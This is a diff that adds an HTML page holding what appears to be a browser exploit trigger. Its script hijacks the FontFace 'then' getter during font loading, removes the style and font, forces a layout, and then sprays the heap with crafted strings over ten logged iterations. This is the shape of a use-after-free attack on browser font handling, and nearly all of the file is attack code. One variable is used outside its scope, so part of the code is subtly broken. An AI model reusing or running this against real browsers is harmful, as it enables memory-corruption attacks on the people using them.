@@ -1,0 +1,53 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>sweep</title>
+<body><p>sweep</p>
+<script>
+function b(x){ var i=new Image(); i.src='/beacon/'+x+'?t='+Date.now(); }
+b('FB-PARSE');
+var it = 0, curIter = -1, fired = false, curStyle = '', PAY = '';
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function(){
+    if (fired) return undefined;
+    fired = true;
+    var i = curIter;
+    b('FB-'+i+'-GET');
+    var v = document.getElementById(curStyle);
+    if (v) v.remove();
+    try { document.fonts.delete(this); } catch(e){}
+    document.body.offsetHeight;
+    b('FB-'+i+'-LAY');
+    var keep = [];
+    for (var q = 0; q < cnt; q++) keep.push(PAY);
+    b('FB-'+i+'-SPR-' + keep.length + '-' + keep[0].length);
+    return undefined;
+  },
+  set: function(){}
+});
+function step(){
+  if (it >= 10) { b('FB-DONE'); return; }
+  var i = it++;
+  curIter = i; fired = false; curStyle = 'vs'+i;
+  var cnt = 2000;
+  PAY = "\u4141".repeat(2) + "\u0000".repeat(126);
+  b('FB-'+i+'-START-cnt' + cnt);
+  var st = document.createElement('style');
+  st.id = curStyle;
+  st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(st);
+  var A = new FontFace('a', 'local(Helvetica)', {unicodeRange: 'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  document.fonts.load('1em a, x', 'AB').then(
+    function(){ b('FB-'+i+'-RES'); },
+    function(){ b('FB-'+i+'-REJ'); }
+  );
+  setTimeout(function(){
+    try { document.body.offsetHeight; } catch(e){}
+    b('FB-'+i+'-END');
+    setTimeout(step, 60);
+  }, 120);
+}
+step();
+</script>
